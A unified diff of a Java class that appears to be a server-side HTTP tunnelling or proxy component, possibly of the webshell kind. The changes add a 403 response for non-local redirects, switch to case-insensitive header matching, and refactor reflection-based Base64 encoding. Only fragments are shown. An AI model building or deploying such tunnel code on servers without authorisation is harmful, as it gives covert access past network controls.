@@ -123,7 +123,6 @@
                     default:
                 }
             } catch (Throwable e) {
-
             } finally {
 
             }
@@ -178,7 +177,6 @@
             // load balance, send request with data to request url
             boolean needRedirect = redirectData != null && redirectData.length > 0;
             if (needRedirect && !isLocalAddr(new String(redirectData))) {
-
                 HttpURLConnection conn = null;
                 try {
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -202,6 +200,7 @@
             byte[] redirectData = (byte[]) dataMap.get("r");
             boolean needRedirect = redirectData != null && redirectData.length > 0;
             if (needRedirect && !isLocalAddr(new String(redirectData))) {
+                resp.setStatus(403);
                 return;
             }
 
@@ -644,16 +643,13 @@
             Enumeration headers = request.getHeaderNames();
             while (headers.hasMoreElements()) {
                 String k = (String) headers.nextElement();
-                if (k.equals("Content-Length")) {
+                if (k.equalsIgnoreCase("Content-Length")) {
                     conn.setRequestProperty(k, String.valueOf(body.length));
-                    continue;
-                } else if (k.equals("Host")) {
+                } else if (k.equalsIgnoreCase("Host")) {
                     conn.setRequestProperty(k, u.getHost());
-                    continue;
-                } else if (k.equals("Connection")) {
+                } else if (k.equalsIgnoreCase("Connection")) {
                     conn.setRequestProperty(k, "close");
-                    continue;
-                } else if (k.equals("Content-Encoding") || k.equals("Transfer-Encoding")) {
+                } else if (k.equalsIgnoreCase("Content-Encoding") || k.equalsIgnoreCase("Transfer-Encoding")) {
                     continue;
                 } else {
                     conn.setRequestProperty(k, request.getHeader(k));
@@ -667,6 +663,7 @@
             conn.getResponseCode();
             return conn;
         }
+
 
         private byte[] toByteArray(InputStream in) {
             try {
@@ -785,15 +782,19 @@
             String value = null;
             try {
                 base64 = Class.forName("java.util.Base64");
-                Object Encoder = base64.getMethod("getEncoder", new Class[0]).invoke(base64, new Object[0]);
-                Class enen = Encoder.getClass();
-                value = (String) enen.getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
+                Object Encoder = base64.getMethod("getEncoder", new Class[0])
+                        .invoke(base64, new Object[0]);
+                value = (String) Encoder.getClass()
+                        .getMethod("encodeToString", new Class[]{byte[].class})
+                        .invoke(Encoder, new Object[]{bs});
             } catch (Exception e) {
                 try {
                     base64 = Class.forName("sun.misc.BASE64Encoder");
                     Object Encoder = base64.newInstance();
-                    Class enen = Encoder.getClass();
-                    value = (String) enen.getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
+                    value = (String) Encoder.getClass()
+                            .getMethod("encode", new Class[]{byte[].class})
+                            .invoke(Encoder, new Object[]{bs});
+                    value = value.replaceAll("\\s+", "");
                 } catch (Exception e2) {
                 }
             }
@@ -805,6 +806,7 @@
             }
             return value;
         }
+
 
         private byte[] base64UrlDecode(String bs) throws Exception {
             if (bs == null) {
